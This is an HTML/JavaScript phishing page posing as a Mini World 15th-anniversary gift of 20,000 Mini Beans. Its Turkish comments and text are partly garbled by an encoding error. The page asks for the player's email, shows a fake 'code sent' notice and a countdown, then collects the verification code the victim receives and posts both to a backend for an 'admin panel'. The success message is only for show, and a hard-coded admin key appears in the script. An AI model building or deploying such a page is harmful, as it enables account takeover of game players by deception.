<!doctype html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <title>Hediye SayfasÄ±</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #1e293b, #0f172a);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .card {
      background: #ffffff;
      color: #0f172a;
      padding: 30px;
      border-radius: 12px;
      width: 360px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.25);
    }
    h1 { text-align: center; margin-bottom: 20px; }
    label { display: block; margin-bottom: 8px; font-weight: 600; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 12px;
      background: #3b82f6;
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
    button:hover { background: #2563eb; }
    .msg { margin-top: 12px; text-align: center; }
    .timer { margin-top: 8px; text-align: center; font-weight: bold; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Mini World Creata 15th Anniversary Special 20,000 Mini Beans gift!</h1>

    <label for="email">Please enter your Email in Mini World</label>
    <input id="email" type="email" placeholder="example@gmail.com" />

    <button id="sendBtn">Verify</button>
    <div id="msg" class="msg"></div>
    <div id="timer" class="timer"></div>

    <!-- Kod girme alanÄ± baÅŸlangÄ±Ã§ta gizli -->
    <div id="codeSection" style="display:none; margin-top:16px;">
      <label for="codeInput">GÃ¶nderilen kodu gir:</label>
      <input id="codeInput" type="text" placeholder="Kodunuzu yazÄ±n" />
      <button id="checkBtn">DoÄŸrula</button>
      <div id="codeMsg" class="msg"></div>
    </div>
  </div>

  <script>
    const sendBtn   = document.getElementById('sendBtn');
    const msg       = document.getElementById('msg');
    const timerDiv  = document.getElementById('timer');
    const codeSec   = document.getElementById('codeSection');
    const checkBtn  = document.getElementById('checkBtn');
    const codeMsg   = document.getElementById('codeMsg');

    // "Kodu GÃ¶nder" â†’ sahte bildirim + geri sayÄ±m + kod alanÄ±nÄ± aÃ§
    sendBtn.addEventListener('click', () => {
      const email = document.getElementById('email').value.trim();
      if (!email) {
        msg.textContent = "LÃ¼tfen eâ€‘posta gir.";
        msg.style.color = "red";
        return;
      }
      msg.textContent = "Kod eâ€‘posta adresine gÃ¶nderildi (TR).";
      msg.style.color = "inherit";
      codeSec.style.display = "block";

      // 3 dakikalÄ±k geri sayÄ±m
      let timeLeft = 180; // saniye
      const interval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerDiv.textContent = `Kalan sÃ¼re: ${minutes}:${seconds < 10 ? '0'+seconds : seconds}`;
        timeLeft--;
        if (timeLeft < 0) {
          clearInterval(interval);
          timerDiv.textContent = "SÃ¼re doldu!";
          codeSec.style.display = "none";
        }
      }, 1000);
    });

    // "DoÄŸrula" â†’ kodu kaydet + mesaj gÃ¶ster
    checkBtn.addEventListener('click', async () => {
      const email = document.getElementById('email').value.trim();
      const code  = document.getElementById('codeInput').value.trim();

      if (!email || !code) {
        codeMsg.textContent = "Eâ€‘posta ve kod zorunlu.";
        codeMsg.style.color = "red";
        return;
      }

      // Admin panelin gÃ¶rebilsin diye backend'e kaydet
      try {
        await fetch('/submit-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, code })
        });
      } catch (e) {
        // Kaydetme hatasÄ± olursa bile kullanÄ±cÄ±ya devam mesajÄ± ver
      }

      // DoÄŸru/yanlÄ±ÅŸ mesajÄ± (gÃ¶sterimlik)
      if (code === "benim-gizli-anahtarim") {
        codeMsg.textContent = "Kod doÄŸru! Hediyen tanÄ±mlandÄ± ğŸ";
        codeMsg.style.color = "green";
      } else {
        codeMsg.textContent = "Kod hatalÄ±!";
        codeMsg.style.color = "red";
      }

      // Ä°steÄŸe baÄŸlÄ± yÃ¶nlendirme: Ä°stersen burada admin'e gitme yerine sayfada kalabilirsin.
      // YÃ¶nlendirmek istersen ÅŸu satÄ±rÄ± aÃ§:
      // window.location.href = "/admin?key=benim-gizli-anahtarim";
    });
  </script>
</body>
</html>
